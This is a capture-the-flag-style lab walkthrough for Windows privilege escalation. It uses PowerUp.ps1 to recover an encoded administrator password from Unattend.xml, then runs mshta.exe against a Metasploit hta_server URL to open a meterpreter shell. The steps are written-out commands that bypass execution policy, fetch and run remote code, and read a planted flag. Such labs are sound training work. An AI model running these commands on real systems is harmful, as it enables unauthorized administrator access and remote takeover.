This lab covers usage of **PowerUp.ps1** Powershell script to find a common Windows privilege escalation flaw.

**PowerSploit**: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.

**PowerUp.ps1:** PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.

Source: https://github.com/PowerShellMafia/PowerSploit

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine and a Windows machine.

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations. The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework has been provided to you on the Windows machine.

**Objective:** Gain access to meterpreter session with high privilege.

# Tools

The best tools for this lab are:

- PowerUp.ps1
- Metasploit Framework
- Powershell

______________

**Step 1:** Switch to Attacker Machine for locating a privilege escalation vulnerability.

![Content Image](https://assets.ine.com/lab/learningpath/201afa39f048e70f1cf9676d1295103f0248e789ffd5707a81f4a2e0e9bb7f79.jpg)

**Step 2:** Open powershell.exe terminal to check the current user.

![Content Image](https://assets.ine.com/lab/learningpath/fd71f522f57bb331a934c2087ef22192a7b33f4cd40328847b0895e76f9cbcb5.jpg)

We are running as a student user. The PowerSploit framework and Powerup.ps1 scripts are provided.

**Step 3:** We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability.

**Commands:**

```
cd .\Desktop\PowerSploit\Privesc\
ls
```

![Content Image](https://assets.ine.com/lab/learningpath/8978de4d8bc60c761f01bda3d9b6161b230008d6cc48574329098b4e53808856.jpg)

**Step 4:** Import PowerUp.ps1 script and Invoke-PrivescAudit function.

**Commands:**

```
powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```

![Content Image](https://assets.ine.com/lab/learningpath/ffad097896ba1cc324c15f0f43d6d7441f85f38a73c4be1e89720680a643a838.jpg)

We can notice that there is an **Unattend.xml** file present on the system. Open the **Unattend.xml** file.

**Unattend.xml:** Unattend.xml is an answer file for installation. The files may contain encoded or plain-text credentials and other sensitive information.

**Step 5:** Reading Unattend.xml file.

**Command:**

```
cat C:\Windows\Panther\Unattend.xml
```

![Content Image](https://assets.ine.com/lab/learningpath/8ad0ba3f864d020b29e2b6cf659ba17c0a19fd98c433b8492f53a57c6b63f307.jpg)

We have discovered an administrator encoded password. i.e **“QWRtaW5AMTIz”**.

**Step 6:** Decoding administrator password using Powershell.

**Commands:**

```
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

![Content Image](https://assets.ine.com/lab/learningpath/6cb58aaf5ee5562b5d920efeadc286ae60c3f89a41c493b63f98849b1d3555e7.jpg)

The administrator password is **“Admin@123”**.

**Step 7:** We are running a command prompt as an administrator user using discover credentials.

**Commands:**

```
runas.exe /user:administrator cmd
Admin@123
whoami
```

![Content Image](https://assets.ine.com/lab/learningpath/738f848c1740b5c9f89ba2d1dfb175997997f67e1faeb12dc58eed7646299233.jpg)

We are running cmd.exe as an administrator.

**Switch to the Kali Machine**.

**Step 8:** Running the **hta_server** module to gain the meterpreter shell. Start msfconsole.

**Commands:**

```
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.”

![Content Image](https://assets.ine.com/lab/learningpath/094a3dea5415953b9a810cdcc0a101b802e665483c5717ee2b04e89ab22314eb.jpg)

Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on cmd.exe with mshta command to gain the meterpreter shell.

**Switch to Target Machine.**

**Step 9:** Gaining a meterpreter shell.

**Command:**

```
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

**Note:** You need to use your own metasploit HTA server link.

![Content Image](https://assets.ine.com/lab/learningpath/795199d7c5d3a084b962a2344f3baa5731645211b8602a418e8aa80a39c401b5.jpg)

We can expect a meterpreter shell.

![Content Image](https://assets.ine.com/lab/learningpath/fd57a3c1aff8145ab113e8ab769b02fc511291f1b39855c83ad6cb9faed2fc1f.jpg)

**Step 10:** Find the flag.

**Commands:**

```
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/80702c06e63261162ce15534d97b40e4186ce9c5c0ebe1d557bb8f637966f194.jpg)

This reveals the flag to us.

**Flag:** 097ab83639dce0ab3429cb0349493f60

# Conclusion

In this lab, we exploited a common Windows privilege escalation flaw and gained a meterpreter session with high privilege.

# References

- [Answer files (unattend.xml)](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs)
- [Metasploit](https://www.metasploit.com/)
- [HTA Web Server](https://www.rapid7.com/db/modules/exploit/windows/misc/hta_server)